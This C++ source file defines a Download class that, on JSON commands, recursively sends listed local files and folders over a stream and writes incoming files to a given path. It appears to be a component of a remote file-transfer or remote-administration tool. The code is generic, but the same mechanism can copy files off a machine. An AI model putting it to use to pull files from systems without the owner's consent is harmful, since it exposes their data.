#include "Download.h"

Download::Download(const Stream &stream) : Sender(stream) {}

void Download::uploadFiles(nlohmann::json jsonObject){
    std::string destinationPath = jsonObject["path"];
    int numOfFiles = jsonObject["num_of_files"];
    RESULT result;
    for (int i = 0; i < numOfFiles; i++) {
        stream.readFile(destinationPath,result);
        if (result==RESULT::SR_ERROR) i=numOfFiles;
    }
}

void Download::downloadContent(nlohmann::json jsonObject) {
    std::vector<std::string> fileList = jsonObject["file_list"];
    for (const auto &file: fileList) {
        if(!download) break;
        std::wstring wide = Converter::string2wstring(file);
        if (std::filesystem::is_directory(wide)) {
            downloadFolder(wide, wide.c_str());
        } else {
            downloadFile(wide,wide);
        }
    }
    stream.sendString("/");
}

void Download::downloadFolder(const std::filesystem::path &filePath, const wchar_t *relativePath) {
    for (const auto &entry: std::filesystem::directory_iterator(filePath)) {
        if (!download) break;
        try {
            if (entry.is_directory()) {
                downloadFolder(entry, relativePath);
            } else {
                downloadFile(entry.path().wstring(),relativePath);
            }
        } catch (std::filesystem::__cxx11::filesystem_error&) {}
    }
}

void Download::downloadFile(const std::wstring &filePath,const std::wstring &basePath) {
    RESULT result;
    stream.sendFile(filePath.c_str(),basePath.c_str(),result);
    if (result==RESULT::SR_ERROR) download=false;
}

void Download::send() {

}



